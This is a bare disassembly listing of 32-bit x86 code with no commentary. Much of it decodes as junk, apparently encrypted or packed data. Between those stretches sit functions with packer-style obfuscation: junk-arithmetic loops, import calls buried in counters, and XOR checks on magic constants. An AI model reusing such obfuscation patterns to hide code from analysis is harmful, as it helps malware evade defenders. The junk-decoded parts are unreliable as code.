  40a132:	js     0x40a100
  40a134:	mov    ch,0xa0
  40a136:	jge    0x40a159
  40a138:	push   ecx
  40a139:	lods   eax,DWORD PTR fs:[esi]
  40a13b:	jecxz  0x40a1bb
  40a13d:	mov    DWORD PTR cs:[ecx+esi*1+0x46c65824],0xec12476c
  40a149:	fstp   TBYTE PTR [ecx-0x51e9070e]
  40a14f:	fistp  DWORD PTR ds:0x8d3acd10
  40a155:	dec    esp
  40a156:	lock ror DWORD PTR [edi],0xd5
  40a15a:	arpl   WORD PTR [esi],bx
  40a15c:	or     eax,0x4220b886
  40a161:	dec    edi
  40a162:	adc    eax,0x76232799
  40a167:	jno    0x40a192
  40a169:	pop    esi
  40a16a:	lock pop ecx
  40a16c:	xchg   edx,eax
  40a16d:	add    cl,dl
  40a16f:	mov    al,0xf1
  40a171:	clc    
  40a172:	xlat   BYTE PTR ds:[ebx]
  40a173:	daa    
  40a174:	repz push ss
  40a176:	add    esi,DWORD PTR gs:[edx+eax*8+0x1c]
  40a17b:	imul   ecx,DWORD PTR [edx],0x2b
  40a17e:	lahf   
  40a17f:	cmp    ecx,edx
  40a181:	clc    
  40a182:	inc    edx
  40a183:	sahf   
  40a184:	call   0x872d6634
  40a189:	ds mov esi,ecx
  40a18c:	push   ebx
  40a18d:	xor    BYTE PTR [esi-0x7e807b83],dl
  40a193:	in     eax,0x89
  40a195:	in     al,0x72
  40a197:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a198:	xchg   ecx,eax
  40a199:	push   esp
  40a19a:	dec    eax
  40a19b:	jae    0x40a205
  40a19d:	mov    esp,0x7ac094b7
  40a1a2:	dec    esp
  40a1a3:	mov    al,al
  40a1a5:	jb     0x40a191
  40a1a7:	pop    ecx
  40a1a8:	outs   dx,DWORD PTR ds:[esi]
  40a1a9:	dec    ebp
  40a1aa:	sub    DWORD PTR [edi+0x40],eax
  40a1ad:	ret    0x4762
  40a1b0:	pop    esi
  40a1b1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a1b2:	(bad)  
  40a1b3:	xchg   esi,eax
  40a1b4:	mul    edi
  40a1b6:	mov    DWORD PTR [eax+0x60718ee5],edx
  40a1bc:	mov    ecx,0x1f4e7d03
  40a1c1:	outs   dx,DWORD PTR ds:[esi]
  40a1c2:	push   eax
  40a1c3:	test   eax,0x504a42cc
  40a1c8:	int3   
  40a1c9:	pop    edi
  40a1ca:	stos   DWORD PTR es:[edi],eax
  40a1cb:	movhps QWORD PTR [ecx],xmm4
  40a1ce:	sub    ebp,ebx
  40a1d0:	outs   dx,DWORD PTR ds:[esi]
  40a1d1:	fiadd  WORD PTR [ebx+edi*8+0x7c]
  40a1d5:	jge    0x40a184
  40a1d7:	jns    0x40a23a
  40a1d9:	popf   
  40a1da:	sub    dl,dh
  40a1dc:	hlt    
  40a1dd:	mov    esp,0xfb61c773
  40a1e2:	(bad)  
  40a1e3:	dec    DWORD PTR [edx-0x2d4b82e5]
  40a1e9:	xor    eax,0x3b73e82f
  40a1ee:	pop    ebx
  40a1ef:	xchg   ecx,eax
  40a1f0:	es inc eax
  40a1f2:	jmp    0x40a19d
  40a1f4:	pop    eax
  40a1f5:	or     BYTE PTR [ecx],dl
  40a1f7:	mov    bh,0x4e
  40a1f9:	(bad)  
  40a1fa:	in     al,0x7
  40a1fc:	jne    0x40a239
  40a1fe:	lock jne 0x40a21b
  40a205:	mov    eax,DWORD PTR [ebp-0x4]
  40a208:	mov    esi,DWORD PTR [ebp-0x8]
  40a20b:	xor    eax,edx
  40a20d:	xor    esi,edx
  40a20f:	add    eax,ecx
  40a211:	add    esi,ecx
  40a213:	imul   eax,esi
  40a216:	jmp    0x40a256
  40a21b:	mov    eax,DWORD PTR [ebp+0xc]
  40a21e:	mov    eax,DWORD PTR [eax+0x78]
  40a221:	mov    DWORD PTR [ebp+0xc],eax
  40a224:	mov    eax,DWORD PTR [ebp-0x4]
  40a227:	mov    esi,DWORD PTR [ebp-0x8]
  40a22a:	xor    eax,edx
  40a22c:	xor    esi,edx
  40a22e:	add    eax,ecx
  40a230:	add    esi,ecx
  40a232:	imul   eax,esi
  40a235:	mov    esi,DWORD PTR [ebp+0xc]
  40a238:	cmp    esi,eax
  40a23a:	mov    eax,DWORD PTR [ebp-0x4]
  40a23d:	je     0x40a208
  40a243:	xor    eax,edx
  40a245:	add    eax,ecx
  40a247:	mov    ecx,DWORD PTR [ebp+0xc]
  40a24a:	imul   eax,ecx
  40a24d:	add    eax,DWORD PTR [ebp+0x8]
  40a250:	mov    DWORD PTR [ebp+0xc],eax
  40a253:	mov    eax,DWORD PTR [ebp+0xc]
  40a256:	pop    esi
  40a257:	leave  
  40a258:	ret    0x8
  40a25b:	push   ebp
  40a25c:	mov    ebp,esp
  40a25e:	sub    esp,0x10
  40a261:	sbb    eax,DWORD PTR ds:0x413c88
  40a267:	mov    eax,0xf89c85b0
  40a26c:	xor    edx,edx
  40a26e:	xor    edx,DWORD PTR ds:0x414014
  40a274:	sub    DWORD PTR ds:0x413cf4,edx
  40a27a:	mov    DWORD PTR [ebp-0x4],eax
  40a27d:	add    ecx,ecx
  40a27f:	mov    DWORD PTR [ebp-0x8],0xf89c85b1
  40a286:	or     DWORD PTR ds:0x414014,edi
  40a28c:	mov    ecx,DWORD PTR [ebp-0x4]
  40a28f:	push   esi
  40a290:	mov    edx,0x7510894
  40a295:	add    esi,0x25d7
  40a29b:	xor    ecx,edx
  40a29d:	mov    DWORD PTR ds:0x413d30,0x18
  40a2a7:	cmp    DWORD PTR ds:0x413d30,0x0
  40a2ae:	je     0x40a2e4
  40a2b4:	cmp    DWORD PTR ds:0x413d30,0x19
  40a2bb:	jne    0x40a2cc
  40a2c1:	push   0x413ce8
  40a2c6:	call   DWORD PTR ds:0x41679c
  40a2cc:	mov    esi,DWORD PTR ds:0x413d30
  40a2d2:	dec    esi
  40a2d3:	mov    DWORD PTR ds:0x413d30,esi
  40a2d9:	jmp    0x40a2a7
  40a2de:	add    esi,DWORD PTR ds:0x413d24
  40a2e4:	mov    esi,0x3272dc
  40a2e9:	neg    DWORD PTR ds:0x413d24
  40a2ef:	push   edi
  40a2f0:	mov    edi,DWORD PTR [ebp+0x10]
  40a2f3:	adc    DWORD PTR ds:0x414008,0x741e
  40a2fd:	add    ecx,esi
  40a2ff:	cmp    ecx,edi
  40a301:	mov    DWORD PTR ds:0x413c80,0x1b1e
  40a30b:	je     0x40a474
  40a311:	mov    ecx,DWORD PTR [ebp-0x4]
  40a314:	mov    edi,DWORD PTR [ebp+0x10]
  40a317:	xor    eax,eax
  40a319:	xor    ecx,edx
  40a31b:	adc    DWORD PTR ds:0x413d2c,0x414008
  40a325:	add    ecx,esi
  40a327:	add    edi,0xfabdbeef
  40a32d:	adc    eax,0xffffffff
  40a330:	neg    DWORD PTR ds:0x413c88
  40a336:	xor    eax,0x0
  40a339:	mov    DWORD PTR [ebp-0xc],eax
  40a33c:	push   ebx
  40a33d:	movzx  eax,BYTE PTR ds:0x413d30
  40a344:	adc    DWORD PTR ds:0x414018,eax
  40a34a:	xor    ebx,ebx
  40a34c:	xor    edi,0x8a29a125
  40a352:	mov    eax,ds:0x413c12
  40a357:	and    DWORD PTR ds:0x413cdc,eax
  40a35d:	mov    eax,ecx
  40a35f:	add    eax,0xfabdbeef
  40a364:	mov    DWORD PTR ds:0x413c6c,0x7b3
  40a36e:	adc    ebx,0xffffffff
  40a371:	add    DWORD PTR ds:0x413c88,0x414018
  40a37b:	xor    eax,0x8a29a125
  40a380:	mov    DWORD PTR ds:0x413d18,0x6932
  40a38a:	xor    ebx,0x0
  40a38d:	mov    DWORD PTR ds:0x413cd8,0x53fd
  40a397:	cmp    eax,edi
  40a399:	mov    DWORD PTR ds:0x413c88,0x1215
  40a3a3:	jne    0x40a3c6
  40a3a9:	mov    DWORD PTR ds:0x413c16,0x2565
  40a3b3:	cmp    ebx,DWORD PTR [ebp-0xc]
  40a3b6:	je     0x40a46e
  40a3bc:	jmp    0x40a3c6
  40a3c1:	mov    esi,0x3272dc
  40a3c6:	and    DWORD PTR ds:0x413d30,0x0
  40a3d0:	xor    eax,eax
  40a3d2:	xor    eax,DWORD PTR ds:0x413d30
  40a3d8:	inc    eax
  40a3d9:	mov    ds:0x413d30,eax
  40a3de:	cmp    DWORD PTR ds:0x413d30,0x26
  40a3e5:	jne    0x40a3f9
  40a3eb:	push   0x413d20
  40a3f0:	push   DWORD PTR [ebp-0x10]
  40a3f3:	call   DWORD PTR ds:0x41675c
  40a3f9:	cmp    DWORD PTR ds:0x413d30,0x1f
  40a400:	jb     0x40a3d0
  40a406:	mov    eax,DWORD PTR [ebp-0x4]
  40a409:	mov    edi,DWORD PTR [ebp-0x8]
  40a40c:	xor    edi,edx
  40a40e:	add    edi,esi
  40a410:	mov    esi,DWORD PTR [ebp+0x8]
  40a413:	imul   edi,ecx
  40a416:	mov    ebx,DWORD PTR [ebp+0xc]
  40a419:	xor    eax,edx
  40a41b:	add    eax,ecx
  40a41d:	mov    al,BYTE PTR [ebx+eax*1+0x3272dc]
  40a424:	mov    BYTE PTR [edi+esi*1],al
  40a427:	mov    eax,DWORD PTR [ebp-0x8]
  40a42a:	mov    esi,DWORD PTR [ebp+0x10]
  40a42d:	xor    eax,edx
  40a42f:	xor    ebx,ebx
  40a431:	add    esi,0xfabdbeef
  40a437:	adc    ebx,0xffffffff
  40a43a:	lea    ecx,[ecx+eax*1+0x3272dc]
  40a441:	xor    edi,edi
  40a443:	xor    esi,0x8a29a125
  40a449:	xor    ebx,0x0
  40a44c:	mov    eax,ecx
  40a44e:	add    eax,0xfabdbeef
  40a453:	adc    edi,0xffffffff
  40a456:	xor    eax,0x8a29a125
  40a45b:	xor    edi,0x0
  40a45e:	cmp    eax,esi
  40a460:	jne    0x40a3c1
  40a466:	cmp    edi,ebx
  40a468:	jne    0x40a3c1
  40a46e:	mov    eax,0xf89c85b1
  40a473:	pop    ebx
  40a474:	pop    edi
  40a475:	pop    esi
  40a476:	leave  
  40a477:	ret    0xc
  40a47a:	push   ebp
  40a47b:	mov    ebp,esp
  40a47d:	sub    esp,0xa4
  40a483:	sbb    DWORD PTR ds:0x413cf4,0x6aac
  40a48d:	mov    ecx,DWORD PTR [ebp+0x8]
  40a490:	and    DWORD PTR ds:0x414008,0x0
  40a49a:	mov    eax,ds:0x414008
  40a49f:	inc    eax
  40a4a0:	mov    ds:0x414008,eax
  40a4a5:	cmp    DWORD PTR ds:0x414008,0x6
  40a4ac:	jne    0x40a4c5
  40a4b2:	push   DWORD PTR [ebp-0x18]
  40a4b5:	push   0x41401c
  40a4ba:	push   0x1f9d
  40a4bf:	call   DWORD PTR ds:0x416760
  40a4c5:	cmp    DWORD PTR ds:0x414008,0x5
  40a4cc:	jne    0x40a4dd
  40a4d2:	mov    eax,ds:0x414008
  40a4d7:	inc    eax
  40a4d8:	mov    ds:0x414008,eax
  40a4dd:	cmp    DWORD PTR ds:0x414008,0x1b
  40a4e4:	jb     0x40a49a
  40a4ea:	mov    DWORD PTR ds:0x41401c,0x17
  40a4f4:	cmp    DWORD PTR ds:0x41401c,0x0
  40a4fb:	je     0x40a54c
  40a501:	cmp    DWORD PTR ds:0x41401c,0x6
  40a508:	jne    0x40a524
  40a50e:	push   DWORD PTR [ebp-0x24]
  40a511:	push   0x3b56
  40a516:	push   DWORD PTR [ebp-0x1c]
  40a519:	push   0x73b3
  40a51e:	call   DWORD PTR ds:0x416764
  40a524:	cmp    DWORD PTR ds:0x41401c,0x7
  40a52b:	jne    0x40a53c
  40a531:	mov    eax,ds:0x41401c
  40a536:	dec    eax
  40a537:	mov    ds:0x41401c,eax
  40a53c:	mov    eax,ds:0x41401c
  40a541:	dec    eax
  40a542:	mov    ds:0x41401c,eax
  40a547:	jmp    0x40a4f4
  40a54c:	mov    eax,0x8a87
  40a551:	xor    ax,WORD PTR [ecx+0x20]
  40a555:	not    DWORD PTR ds:0x413cf4
  40a55b:	mov    ecx,0x3b4a
  40a560:	adc    DWORD PTR ds:0x413c0a,0x414008
  40a56a:	add    ax,cx
  40a56d:	movzx  eax,ax
  40a570:	mov    DWORD PTR [ebp-0x18],eax
  40a573:	mov    ecx,DWORD PTR ds:0x413c78
  40a579:	sbb    DWORD PTR ds:0x413d28,ecx
  40a57f:	mov    BYTE PTR [ebp-0x1],0x7d
  40a583:	add    ecx,DWORD PTR ds:0x414000
  40a589:	lea    eax,[ebp-0x1]
  40a58c:	xor    DWORD PTR ds:0x413c78,ecx
  40a592:	mov    DWORD PTR [ebp-0x10],eax
  40a595:	add    DWORD PTR ds:0x413d1c,0x4151
  40a59f:	mov    al,BYTE PTR [ebp-0x1]
  40a5a2:	mov    ecx,DWORD PTR [ebp-0x10]
  40a5a5:	or     DWORD PTR ds:0x413d20,0x66e0
  40a5af:	xor    al,0x70
  40a5b1:	and    DWORD PTR ds:0x414000,0x34d9
  40a5bb:	sub    al,0xc
  40a5bd:	and    DWORD PTR ds:0x413d1c,0x413c70
  40a5c7:	mov    BYTE PTR [ecx],al
  40a5c9:	mov    DWORD PTR [ebp-0x14],0xf89c85b0
  40a5d0:	or     DWORD PTR ds:0x413ce0,ecx
  40a5d6:	push   ebx
  40a5d7:	jmp    0x40c95f
  40a5dc:	and    ch,BYTE PTR ds:0xb393b193
  40a5e2:	add    cl,BYTE PTR [edi-0x6bf6fe89]
  40a5e8:	push   edx
  40a5e9:	mov    DWORD PTR [edx+0x2a],eax
  40a5ec:	daa    
  40a5ed:	push   es
  40a5ee:	jl     0x40a66c
  40a5f0:	pop    es
  40a5f1:	pop    edi
  40a5f2:	jl     0x40a670
  40a5f4:	das    
  40a5f5:	iret   
  40a5f6:	lea    ebx,[esi-0x5912213a]
  40a5fc:	dec    edi
  40a5fd:	iret   
  40a5fe:	dec    edi
  40a5ff:	ret    0x26f5
  40a602:	xchg   edx,eax
  40a603:	(bad)  
  40a604:	bound  ebp,QWORD PTR [eax+0x74f05fc1]
  40a60a:	or     BYTE PTR [eax-0x47],0xf2
  40a60e:	lods   eax,DWORD PTR ds:[esi]
  40a60f:	pop    es
  40a610:	rcr    BYTE PTR [edx],1
  40a612:	scas   al,BYTE PTR es:[edi]
  40a613:	fwait
  40a614:	push   DWORD PTR [esi+0x3a02277d]
  40a61a:	cli    
  40a61b:	iret   
  40a61c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a61d:	jp     0x40a625
  40a61f:	mov    edx,0x243cdc8d
  40a624:	call   0xacb2:0x33a733b3
  40a62b:	into   
  40a62c:	dec    ecx
  40a62d:	fadd   DWORD PTR [ebx+0x4a65b364]
  40a633:	imul   DWORD PTR [edi]
  40a635:	sub    bl,BYTE PTR [ebx+eiz*8-0x31]
  40a639:	inc    ebx
  40a63a:	push   cs
  40a63b:	xor    DWORD PTR [bp+di],esp
  40a63e:	imul   ecx,DWORD PTR [edx],0x2a9f54c7
  40a644:	leave  
  40a645:	(bad)  
  40a646:	cs and al,0x9d
  40a649:	add    bl,BYTE PTR [edi-0x67]
  40a64c:	loopne 0x40a66b
  40a64e:	sub    BYTE PTR [eax],cl
  40a650:	test   eax,0xb773a9
  40a655:	sub    ebp,DWORD PTR [ebx]
  40a657:	stos   BYTE PTR es:[edi],al
  40a658:	imul   edi,eax,0xae267080
  40a65e:	cdq    
  40a65f:	mov    cl,0x33
  40a661:	lods   al,BYTE PTR ds:[esi]
  40a662:	and    al,0x3
  40a664:	mov    ch,0xea
  40a666:	inc    edi
  40a667:	dec    edi
  40a668:	jno    0x40a60f
  40a66a:	fidiv  WORD PTR [ebx-0x77]
  40a66d:	(bad)  
  40a66f:	pop    es
  40a670:	loopne 0x40a613
  40a672:	shl    DWORD PTR [edi+0x65b56d87],1
  40a678:	inc    ebp
  40a679:	bound  esp,QWORD PTR [esi]
  40a67b:	out    0xa8,al
  40a67d:	jp     0x40a65c
  40a67f:	push   0x7f
  40a681:	xor    edx,DWORD PTR [edi+0x59]
  40a684:	dec    eax
  40a685:	xor    ebp,DWORD PTR [eax]
  40a687:	cld    
  40a688:	mov    BYTE PTR [ecx-0x6d],bh
  40a68b:	dec    eax
  40a68c:	and    DWORD PTR [edx],0x4ba64de9
  40a692:	std    
  40a693:	adc    dh,al
  40a695:	xor    eax,0x5df65453
  40a69a:	inc    ebp
  40a69b:	and    ah,BYTE PTR [esi]
  40a69d:	pusha  
  40a69e:	push   esp
  40a69f:	stc    
  40a6a0:	push   cs
  40a6a1:	ror    BYTE PTR [edx],1
  40a6a3:	dec    eax
  40a6a4:	bound  eax,QWORD PTR [ecx]
  40a6a6:	icebp  
  40a6a7:	pop    ds
  40a6a8:	jge    0x40a6f7
  40a6aa:	out    dx,eax
  40a6ab:	inc    eax
  40a6ac:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a6ad:	push   0x3f
  40a6af:	enter  0xfe4d,0x11
  40a6b3:	jle    0x40a708
  40a6b5:	jns    0x40a729
  40a6b7:	inc    ebp
  40a6b8:	aam    0x1
  40a6ba:	stc    
  40a6bb:	or     al,0xbf
  40a6bd:	rcr    BYTE PTR [edi-0x3777dac1],cl
  40a6c3:	fisttp WORD PTR [ecx+0x18be6cfe]
  40a6ca:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a6cb:	dec    ebx
  40a6cc:	imul   esp,DWORD PTR [ecx+eiz*4-0x554a433c],0x5c
  40a6d4:	push   0x2582cabe
  40a6d9:	dec    esi
  40a6da:	dec    ecx
  40a6db:	mov    ebx,0xc264c813
  40a6e0:	sbb    ch,BYTE PTR [edi+edx*2+0x1c8a3871]
  40a6e7:	retf   
  40a6e8:	xchg   esi,eax
  40a6e9:	ins    DWORD PTR es:[edi],dx
  40a6ea:	(bad)  
  40a6eb:	or     eax,DWORD PTR [ebp-0x2e]
  40a6ee:	or     DWORD PTR [edi+edx*1],edx
  40a6f1:	mov    edx,0x453e857b
  40a6f6:	push   ebp
  40a6f7:	mov    dl,BYTE PTR [edi+0x2c]
  40a6fa:	dec    ecx
  40a6fb:	rcl    DWORD PTR [eax],0x89
  40a6fe:	dec    edi
  40a6ff:	fimul  WORD PTR [esp+edx*8-0x19]
  40a703:	mov    eax,DWORD PTR [edx-0x12]
  40a706:	outs   dx,BYTE PTR ds:[esi]
  40a707:	jmp    0x4436:0xc79a6e66
  40a70e:	push   es
  40a70f:	mov    edx,0xd927223d
  40a714:	jge    0x40a69e
  40a716:	loopne 0x40a6c6
  40a718:	retf   
  40a719:	cdq    
  40a71a:	dec    bp
  40a71c:	sbb    al,0x6c
  40a71e:	jg     0x40a6c2
  40a720:	aad    0xc6
  40a722:	popf   
  40a723:	ds jae 0x40a720
  40a726:	pusha  
  40a727:	push   ebx
  40a728:	aas    
  40a729:	loopne 0x40a6d1
  40a72b:	test   eax,0x227db6e1
  40a730:	cmp    eax,0xa5921b8f
  40a735:	fmul   QWORD PTR [ebx+0x2]
  40a738:	or     DWORD PTR [edx+0x4de5c928],edx
  40a73e:	int    0xba
  40a740:	adc    ebp,DWORD PTR [edx]
  40a742:	add    ebp,ebp
  40a744:	add    al,0x47
  40a746:	jl     0x40a762
  40a748:	rcl    DWORD PTR [edi-0x7111d541],1
  40a74e:	popf   
  40a74f:	sub    eax,0x132de565
  40a754:	xor    DWORD PTR [ebp-0x42bc8225],esp
  40a75a:	fisub  WORD PTR [edx-0x7ffb0d44]
  40a760:	fld    st(3)
  40a762:	cmp    dh,BYTE PTR ds:0xa54b4700
  40a768:	inc    ebp
  40a769:	fucomp st(6)
  40a76b:	pop    esi
  40a76c:	or     DWORD PTR [ecx+0x6f516a5c],eax
  40a772:	out    dx,al
  40a773:	push   es
  40a774:	push   0x412417a2
  40a779:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a77a:	sub    edi,edx
  40a77c:	push   0x81cf45f7
  40a781:	cmp    eax,0xbf69205d
  40a786:	xchg   ecx,eax
  40a787:	ret    
  40a788:	rcl    ecx,1
  40a78a:	sbb    bl,ah
  40a78c:	out    dx,al
  40a78d:	std    
  40a78e:	cmp    eax,0x7a7c1b84
  40a793:	sahf   
  40a794:	es (bad) 
  40a796:	scas   eax,DWORD PTR es:[edi]
  40a797:	aad    0xd
  40a799:	mov    esi,0xb25824c4
  40a79e:	iret   
  40a79f:	adc    DWORD PTR [ebx+edi*8+0x5c],0x6cdceb1
  40a7a7:	cld    
  40a7a8:	cs xchg esp,eax
  40a7aa:	scas   al,BYTE PTR es:[edi]
  40a7ab:	adc    al,0x35
  40a7ad:	aam    0xc8
  40a7af:	jmp    0xd32f6b63
  40a7b4:	sub    al,0x72
  40a7b6:	nop
  40a7b7:	push   ebp
  40a7b8:	sbb    ah,BYTE PTR [ecx]
  40a7ba:	in     al,0x5d
  40a7bc:	fiadd  WORD PTR [esi+0x6]
  40a7bf:	idiv   BYTE PTR [ecx-0x20282430]
  40a7c5:	adc    DWORD PTR [ecx-0x55],edx
  40a7c8:	push   eax
  40a7c9:	cmc    
  40a7ca:	and    BYTE PTR [edi+0x17],dh
  40a7cd:	mov    dh,0xf5
  40a7cf:	jl     0x40a79e
  40a7d1:	mov    edx,0xa5c92b97
  40a7d6:	fild   QWORD PTR [ecx+0x4989af5d]
  40a7dc:	pop    eax
  40a7dd:	std    
  40a7de:	inc    edi
  40a7df:	(bad)  
  40a7e0:	xchg   edx,eax
  40a7e1:	xor    BYTE PTR [ebx-0x27fa48bc],0x95
  40a7e8:	outs   dx,DWORD PTR ds:[esi]
  40a7e9:	popf   
  40a7ea:	in     eax,0x5e
  40a7ec:	push   esp
  40a7ed:	in     eax,0x89
  40a7ef:	inc    ebp
  40a7f0:	sbb    BYTE PTR [ebx+0x41],0x4d
  40a7f4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a7f5:	mov    bl,0x43
  40a7f7:	jae    0x40a7f6
  40a7f9:	jle    0x40a7fa
  40a7fb:	stos   DWORD PTR es:[edi],eax
  40a7fc:	pop    eax
  40a7fd:	jmp    0x506b:0x99d6e82b
  40a804:	nop
  40a805:	inc    esi
  40a806:	popa   
  40a807:	rcl    bl,0x86
  40a80a:	or     dh,BYTE PTR [edi]
  40a80c:	sbb    al,0x38
  40a80e:	mov    DWORD PTR [esi],edx
  40a810:	cmp    cl,ch
  40a812:	sbb    al,0x22
  40a814:	xlat   BYTE PTR ds:[ebx]
  40a815:	test   al,0x46
  40a817:	sbb    esp,DWORD PTR [ebx+eax*8-0x5a]
  40a81b:	test   DWORD PTR [ebx+eax*2],0x79206433
  40a822:	inc    esi
  40a823:	js     0x40a842
  40a825:	pop    ss
  40a826:	dec    eax
  40a827:	sbb    ecx,DWORD PTR [edi+0x23]
  40a82a:	push   ss
  40a82b:	sub    bh,BYTE PTR [esi+0x3256c7fc]
  40a831:	call   0x6a1e2457
  40a836:	pop    esi
  40a837:	(bad)  
  40a838:	pop    esp
  40a839:	mov    ecx,0xd9402fe3
  40a83e:	mov    ds:0x905e44d5,al
  40a843:	jae    0x40a88b
  40a845:	pop    ss
  40a846:	cmp    dl,BYTE PTR fs:0xef036569
  40a84d:	inc    edi
  40a84e:	test   eax,0xb4187087
  40a853:	cli    
  40a854:	pop    ebx
  40a855:	retf   
  40a856:	dec    esi
  40a857:	not    esi
  40a859:	mov    edx,0x237e1bc2
  40a85e:	imul   ebx,DWORD PTR [edi-0x3],0x55
  40a862:	pop    ebx
  40a863:	jne    0x40a8b0
  40a865:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a866:	mov    ds:0x732dc2ff,al
  40a86b:	mov    ebx,0x7ca22d54
  40a870:	jmp    0x17b4:0x4777fbcb
  40a877:	cmp    BYTE PTR [ebx-0x3598a4bc],0xe
  40a87e:	(bad)  
  40a87f:	popa   
  40a880:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a881:	jo     0x40a81b
  40a883:	pop    eax
  40a884:	stos   BYTE PTR es:[edi],al
  40a885:	scas   al,BYTE PTR es:[edi]
  40a886:	cmp    DWORD PTR [edi+0x6246f8d4],0xffffff8c
  40a88d:	lods   al,BYTE PTR ds:[esi]
  40a88e:	lock test BYTE PTR [eax],ch
  40a891:	fbstp  TBYTE PTR [edi+0x51]
  40a894:	ja     0x40a873
  40a896:	inc    ebx
  40a897:	jnp    0x40a916
  40a899:	push   esi
  40a89a:	fnstcw WORD PTR [esi-0xc]
  40a89d:	ins    BYTE PTR es:[edi],dx
  40a89e:	push   ecx
  40a89f:	add    eax,DWORD PTR [eax]
  40a8a1:	sub    DWORD PTR [ecx],0x89b46771
  40a8a7:	ds nop
  40a8a9:	push   edi
  40a8aa:	pop    eax
  40a8ab:	mov    ds:0xf7618a3,eax
  40a8b0:	mov    edx,0x2211fe29
  40a8b5:	clc    
  40a8b6:	cs xor al,0x5f
  40a8b9:	xor    ebx,DWORD PTR [eax+edi*1]
  40a8bc:	mov    dh,0x2c
  40a8be:	stos   DWORD PTR es:[edi],eax
  40a8bf:	adc    esp,DWORD PTR [ebp+0x36]
  40a8c2:	popf   
  40a8c3:	aaa    
  40a8c4:	xchg   ebp,eax
  40a8c5:	cli    
  40a8c6:	test   BYTE PTR [esi],ch
  40a8c8:	psadbw mm5,QWORD PTR [ebx]
  40a8cb:	pop    ebp
  40a8cc:	xchg   edi,eax
  40a8cd:	jmp    0x7b72ee50
  40a8d2:	vpsllq xmm0,xmm0,xmm2
  40a8d6:	lods   al,BYTE PTR ds:[esi]
  40a8d7:	mov    dh,0x52
  40a8d9:	jns    0x40a89d
  40a8db:	adc    cl,0x49
  40a8de:	sbb    BYTE PTR [edi+0x1ed99ccd],ch
  40a8e4:	mov    ds:0x137158c,eax
  40a8e9:	jbe    0x40a8f9
  40a8eb:	loope  0x40a959
  40a8ed:	(bad)  
  40a8ee:	cli    
  40a8ef:	sub    eax,0xf68a7e75
  40a8f4:	(bad)  
  40a8f5:	outs   dx,DWORD PTR ds:[esi]
  40a8f6:	cmp    eax,0x1d6a5889
  40a8fb:	inc    esp
  40a8fc:	mov    ebp,0xf5e776ff
  40a901:	sahf   
  40a902:	add    BYTE PTR [edx+esi*1],bl
  40a905:	loopne 0x40a8fe
  40a907:	inc    ecx
  40a908:	push   0xffffffe8
  40a90a:	and    al,BYTE PTR [ebx-0x6d]
  40a90d:	mov    cl,0x85
  40a90f:	cmp    eax,0xd6cec5a3
  40a914:	sub    DWORD PTR [ebp+esi*8+0x19],edi
  40a918:	xchg   esi,eax
  40a919:	ins    BYTE PTR es:[edi],dx
  40a91a:	fwait
  40a91b:	jg     0x40a8fd
  40a91d:	xor    BYTE PTR [eax-0x3e2197de],dh
  40a923:	add    eax,0x57154a05
  40a928:	ds cdq 
  40a92a:	jge    0x40a8da
  40a92c:	push   ecx
  40a92d:	push   ebx
  40a92e:	dec    edx
  40a92f:	daa    
  40a930:	jg     0x40a951
  40a932:	mov    ch,0x53
  40a934:	aas    
  40a935:	adc    bh,BYTE PTR ds:0xae7f0616
  40a93b:	call   FWORD PTR [edx+ebp*8]
  40a93e:	sbb    esi,DWORD PTR [eax-0x16]
  40a941:	test   BYTE PTR [ebx],0x8
  40a944:	add    DWORD PTR [edx],ebx
  40a946:	sbb    DWORD PTR [ebp+0x2c5da8b6],edx
  40a94c:	sbb    BYTE PTR [edi],al
  40a94e:	mov    bl,0xa8
  40a950:	dec    ebx
  40a951:	and    eax,0x491160bc
  40a956:	xchg   edx,eax
  40a957:	sti    
  40a958:	mov    ebp,0x12754250
  40a95d:	pop    ss
  40a95e:	fst    QWORD PTR [esi]
  40a960:	mov    al,ds:0x81a017d9
  40a965:	mov    ch,0x34
  40a967:	dec    esp
  40a968:	adc    eax,0x5895bb90
  40a96d:	sti    
  40a96e:	push   edx
  40a96f:	out    0x90,eax
  40a971:	push   cs
  40a972:	jg     0x40a959
  40a974:	inc    edx
  40a975:	cs mov dl,0x29
  40a978:	stos   DWORD PTR es:[edi],eax
  40a979:	jnp    0x40a923
  40a97b:	fld    TBYTE PTR [eax-0x1a]
  40a97e:	inc    edx
  40a97f:	push   edi
  40a980:	call   0xd440:0xc680a0db
  40a987:	dec    edx
  40a988:	jmp    0xb26c:0x71fb0d97
  40a98f:	repz sbb BYTE PTR [eax+0x6],cl
  40a993:	leave  
  40a994:	std    
  40a995:	inc    ebp
  40a996:	push   edi
  40a997:	push   ebp
  40a998:	xor    esp,ecx
  40a99a:	jbe    0x40a968
  40a99c:	sbb    DWORD PTR [ebp-0x65],ecx
  40a99f:	aas    
  40a9a0:	push   esi
  40a9a1:	retf   
  40a9a2:	outs   dx,BYTE PTR ds:[esi]
  40a9a3:	jae    0x40aa12
  40a9a5:	mov    esp,0xca180a1c
  40a9aa:	leave  
  40a9ab:	sub    ecx,esp
  40a9ad:	and    al,0x3d
  40a9af:	sub    dh,BYTE PTR [esi+0x595a88d7]
  40a9b5:	retf   0x2e5f
  40a9b8:	sbb    BYTE PTR cs:[ebx],0x5e
  40a9bc:	or     ebp,DWORD PTR [eax-0x1c]
  40a9bf:	arpl   WORD PTR [ebx+0x1f],di
  40a9c2:	sbb    DWORD PTR [ebx-0x62],ecx
  40a9c5:	sub    DWORD PTR [ebp-0x3527a477],edx
  40a9cb:	in     eax,0xbb
  40a9cd:	retf   
  40a9ce:	xchg   BYTE PTR [ecx],dl
  40a9d0:	pop    esp
  40a9d1:	sbb    al,0xce
  40a9d3:	mov    cl,0xb0
  40a9d5:	enter  0xb354,0x8
  40a9d9:	lea    ebx,[esi-0x137ab3ad]
  40a9df:	mov    esp,0x72e0fee5
  40a9e4:	adc    BYTE PTR [eax-0x516d7bb2],cl
  40a9ea:	outs   dx,BYTE PTR ds:[esi]
  40a9eb:	lods   eax,DWORD PTR ds:[esi]
